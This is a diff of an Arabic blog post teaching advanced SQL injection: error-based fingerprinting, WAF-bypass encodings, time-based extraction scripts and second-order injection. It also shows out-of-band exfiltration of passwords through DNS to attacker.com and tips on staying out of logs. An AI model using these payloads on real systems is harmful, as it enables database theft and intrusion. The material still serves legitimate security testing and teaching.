@@ -1,139 +1,145 @@
 ---
 layout: blog
-title: "SQL Injection تقنيات متقدمة: من Boolean-Based إلى Out-of-Band واستغلال Second-Order"
-date: 2026-03-29T06:09:31Z
+title: "SQL Injection: تقنيات متقدمة للتجاوز والاستغلال في بيئات الإنتاج المحصنة"
+date: 2026-03-29T16:11:33Z
 category: "تقنية"
-excerpt: "SQL Injection لا تزال من أخطر الثغرات رغم مرور عقود على اكتشافها. التقنيات المتقدمة تتجاوز الاستغلال البسيط إلى أساليب معقدة كـ Time-Based Blind، وOut-of-Band، وSecond-Order Injection. في هذا المقال نستعرض تقنيات الاستغلال المتقدمة التي يحتاجها كل penetration tester محترف."
+excerpt: "تجاوزت هجمات SQL Injection مرحلة الاستغلال البسيط منذ سنوات. اليوم، نواجه Web Application Firewalls متطورة وآليات تصفية معقدة تتطلب تقنيات أكثر ذكاءً. في هذه المقالة، نستكشف أساليب متقدمة للتحايل على الحمايات واستخراج البيانات من أنظمة محصنة بشكل احترافي."
 read_time: 8
-tags: ["SQL Injection", "Web Security", "Penetration Testing", "Blind SQLi", "OWASP"]
+tags: ["SQL Injection", "Web Application Security", "Penetration Testing", "WAF Bypass", "Offensive Security"]
 slug: "advanced-sql-injection"
 ---
 
-## فهم البيئة: من Union-Based إلى Blind Injection
+## فهم البيئة المستهدفة قبل الهجوم
 
-عندما نتحدث عن SQL Injection المتقدم، نتجاوز الـ Union-Based البسيط. معظم التطبيقات الحديثة لا تعرض أخطاء SQL مباشرة، مما يجبرنا على استخدام Blind Injection.
+قبل البدء بأي payload متقدم، تحتاج لرسم خريطة دقيقة للبيئة. معرفة نوع قاعدة البيانات (MySQL, PostgreSQL, MSSQL) أمر حاسم. استخدم تقنية Error-based fingerprinting عبر إثارة أخطاء مقصودة:
 
-الفرق الجوهري بين Boolean-Based وTime-Based هو طريقة استخراج البيانات. في Boolean-Based نعتمد على تغير سلوك التطبيق (محتوى مختلف، redirect، إلخ)، بينما في Time-Based نعتمد على فرق التوقيت.
-
-```python
-# Boolean-Based SQLi للكشف عن طول اسم قاعدة البيانات
-import requests
-
-url = "https://target.com/product?id=1"
-for length in range(1, 20):
-    payload = f"1' AND LENGTH(DATABASE())={length}-- -"
-    response = requests.get(url, params={'id': payload})
-    
-    if "Product Found" in response.text:
-        print(f"[+] Database name length: {length}")
-        break
+```sql
+' AND 1=CAST(@@version AS int)--
 ```
 
-التقنية هنا تعتمد على مراقبة الـ response. إذا كان طول اسم قاعدة البيانات صحيحًا، سيظهر المنتج. وإلا، صفحة خطأ أو لا شيء.
+هذا الـ payload يجبر قاعدة البيانات على الكشف عن نسختها في رسالة الخطأ. في PostgreSQL، جرّب:
 
-## Time-Based Blind: الاستغلال عبر التأخير
+```sql
+' AND 1=CAST(version() AS int)--
+```
 
-عندما لا يوجد أي فرق في الـ response، نلجأ لـ Time-Based. نستخدم دوال مثل `SLEEP()` في MySQL أو `WAITFOR DELAY` في SQL Server أو `pg_sleep()` في PostgreSQL.
+الفكرة هنا ليست مجرد اكتشاف الثغرة، بل فهم البنية التحتية الكاملة. معرفة إصدار قاعدة البيانات تكشف لك الـ functions المتاحة والقيود الأمنية المطبقة افتراضياً.
+
+## تجاوز WAF باستخدام Encoding Techniques
+
+أنظمة WAF الحديثة تعتمد على Signature-based detection. التحايل عليها يتطلب تشويه الـ payload بطرق تبقيه فعالاً تقنياً لكن غير مرئي للفلاتر.
+
+تقنية URL Encoding المتعدد الطبقات فعالة جداً:
+
+```python
+import urllib.parse
+
+payload = "' OR 1=1--"
+encoded_once = urllib.parse.quote(payload)
+encoded_twice = urllib.parse.quote(encoded_once)
+print(encoded_twice)  # %2527%2520OR%25201%253D1--
+```
+
+بعض الأنظمة تفك Encoding مرة واحدة فقط، بينما قاعدة البيانات تفكه مرتين. استخدم أيضاً Unicode encoding للكلمات المحجوبة:
+
+```sql
+' \u0055NION \u0053ELECT NULL--
+```
+
+أو استخدم case manipulation مع inline comments في MySQL:
+
+```sql
+' UnIoN/**/SeLeCt/**/NULL,NULL--
+```
+
+الـ WAF يبحث عن "UNION SELECT" بشكل مباشر، لكن قاعدة البيانات تتجاهل الـ comments وتنفذ الأمر.
+
+## Time-based Blind SQL Injection للاستخراج الصامت
+
+عندما لا يعرض التطبيق أي output مباشر، تصبح Time-based techniques سلاحك الوحيد. الفكرة: اطرح أسئلة boolean واجعل قاعدة البيانات "تجيب" عبر التأخير.
+
+في MySQL، استخدم SLEEP():
+
+```sql
+' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
+```
+
+إذا تأخر الرد 5 ثوان، الحرف الأول من اسم قاعدة البيانات هو 'a'. كرر العملية لكل حرف. في PostgreSQL:
+
+```sql
+' AND (SELECT CASE WHEN (SELECT SUBSTRING(current_database(),1,1))='a' THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+```
+
+لأتمتة هذا، استخدم SQLMap مع خيار `--technique=T` أو اكتب سكريبت Python:
 
 ```python
 import requests
+import string
 import time
 
-def extract_database_name():
-    database_name = ""
-    charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
-    
-    for position in range(1, 20):
-        for char in charset:
-            payload = f"1' AND IF(SUBSTRING(DATABASE(),{position},1)='{char}',SLEEP(3),0)-- -"
-            
-            start = time.time()
-            requests.get("https://target.com/product", params={'id': payload}, timeout=5)
-            elapsed = time.time() - start
-            
-            if elapsed >= 3:
-                database_name += char
-                print(f"[+] Found char: {char} | Database: {database_name}")
-                break
-    
-    return database_name
+url = "http://target.com/page?id=1"
+result = ""
+
+for position in range(1, 20):
+    for char in string.ascii_lowercase + string.digits:
+        payload = f"' AND IF(SUBSTRING(database(),{position},1)='{char}',SLEEP(3),0)--"
+        start = time.time()
+        requests.get(url + payload)
+        elapsed = time.time() - start
+        
+        if elapsed > 2.5:
+            result += char
+            print(f"Found: {result}")
+            break
 ```
 
-هذا الأسلوب بطيء لكنه فعال جدًا. المشكلة الوحيدة: الضوضاء في الشبكة قد تؤثر على الدقة. لذلك استخدم timeout مناسب وكرر الـ request إذا لزم الأمر.
+## Second-order SQL Injection: الاستغلال المؤجل
 
-## Out-of-Band (OOB): الاستغلال خارج النطاق
+هذه التقنية تتجاوز معظم أنظمة الحماية لأنها تعتمد على فصل زمني بين الـ injection والتنفيذ. تحقن payload في المرحلة الأولى (مثل التسجيل)، ثم يُنفذ لاحقاً في سياق مختلف.
 
-عندما يفشل كل شيء، نلجأ لـ OOB. هنا نجبر قاعدة البيانات على إرسال البيانات إلى خادم نتحكم فيه.
-
-في SQL Server نستخدم `xp_dirtree` أو `xp_cmdshell`، وفي Oracle نستخدم `UTL_HTTP` أو `UTL_INADDR`.
+مثال واقعي: عند التسجيل في موقع، أدخل في حقل الاسم:
 
 ```sql
--- SQL Server: تسريب البيانات عبر DNS
-'; DECLARE @data VARCHAR(100);
-SELECT @data = (SELECT TOP 1 username FROM users);
-EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\\share"');--
+admin'--
 ```
 
-على جهازك، شغّل DNS server أو HTTP server لالتقاط الطلبات:
+التطبيق قد ينظف الـ input هنا، لكن يحفظه في قاعدة البيانات. لاحقاً، عند عرض الملف الشخصي، قد يُبنى استعلام:
+
+```sql
+SELECT * FROM profiles WHERE username = 'admin'--' 
+```
+
+الـ payload نُفذ في سياق لم يتوقعه المطور. هذه التقنية تتطلب صبراً وفهماً عميقاً لتدفق البيانات في التطبيق.
+
+## Out-of-band Data Exfiltration
+
+عندما تفشل كل الطرق السابقة، استخدم DNS أو HTTP لتسريب البيانات. في MySQL مع صلاحيات LOAD_FILE:
+
+```sql
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--
+```
+
+هذا يجبر الخادم على إجراء DNS lookup لـ `[password].attacker.com`، وتلتقط أنت البيانات عبر DNS server تديره.
+
+في MSSQL مع xp_dirtree:
+
+```sql
+'; EXEC master..xp_dirtree '\\'++(SELECT TOP 1 password FROM users)++'.attacker.com\share'--
+```
+
+راقب DNS logs على سيرفرك:
 
 ```bash
-# استخدم tcpdump للمراقبة
-sudo tcpdump -i eth0 -n port 53
-
-# أو استخدم Python HTTP server
-python3 -m http.server 80
+tcpdump -i eth0 -n port 53 | grep attacker.com
 ```
 
-ستصل البيانات كـ subdomain أو في الـ request path. هذا الأسلوب قوي لأنه لا يعتمد على response التطبيق.
+## الخلاصة العملية
 
-## Second-Order SQL Injection: الاستغلال المؤجل
+النجاح في SQL Injection المتقدم يتطلب منهجية:
 
-Second-Order من أصعب الثغرات اكتشافًا. البيانات المُدخلة في نقطة ما (مثل التسجيل) تُخزن في قاعدة البيانات، ثم تُستخدم لاحقًا في استعلام آخر بدون sanitization.
+1. **Reconnaissance شامل**: افهم التقنية المستخدمة قبل أي محاولة
+2. **Iterative testing**: جرّب تقنيات متعددة بشكل منهجي
+3. **Automation ذكية**: استخدم أدوات لكن افهم ما تفعله
+4. **Stealth**: تجنب الضجيج في Logs قدر الإمكان
 
-مثال: عند التسجيل، تدخل username يحتوي على payload:
-
-```python
-# خطوة 1: التسجيل
-username = "admin'-- -"
-email = "attacker@evil.com"
-password = "Password123"
-
-requests.post("https://target.com/register", data={
-    'username': username,
-    'email': email,
-    'password': password
-})
-```
-
-التطبيق يخزن `admin'-- -` في قاعدة البيانات. لاحقًا، عند استرجاع الملف الشخصي:
-
-```sql
--- الاستعلام في الخلفية
-SELECT * FROM profiles WHERE username = 'admin'-- -' AND user_id = 123;
-```
-
-الـ payload نشط الآن. تكتشف Second-Order عبر:
-1. تتبع تدفق البيانات (data flow analysis)
-2. اختبار جميع نقاط الإدخال واستخدامها لاحقًا
-3. استخدام payloads مميزة (unique identifiers) لتتبعها
-
-## التقنيات الدفاعية: ما الذي يجب أن تعرفه
-
-كـ penetration tester، فهمك للدفاعات يحسن هجماتك:
-
-**Prepared Statements**: أقوى دفاع. يفصل البيانات عن الاستعلام تمامًا.
-
-**WAF Bypass**: معظم الـ WAFs تبحث عن patterns معروفة. استخدم:
-- Encoding متعدد: `%25%32%37` بدلاً من `'`
-- Case variation: `uNiOn sElEcT`
-- Comments: `UN/**/ION SE/**/LECT`
-- Alternative syntax: `||` بدلاً من `CONCAT`
-
-```sql
--- Bypass مثال
-1' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,version()-- -
-```
-
-**Rate Limiting**: في Time-Based، الـ rate limiting يبطئ الاستغلال. استخدم distributed requests أو قلل عدد الطلبات بتحسين الـ charset المستخدم.
-
-الخلاصة: SQL Injection المتقدم يتطلب صبرًا وفهمًا عميقًا لقواعد البيانات. كل DBMS له خصائصه وdocsالخاصة. اقرأ الوثائق، جرب في بيئة معملية، وطور أدواتك الخاصة.
+تذكر: هذه التقنيات للـ Authorized Penetration Testing فقط. استخدامها بدون إذن يُعد جريمة في معظم الدول.
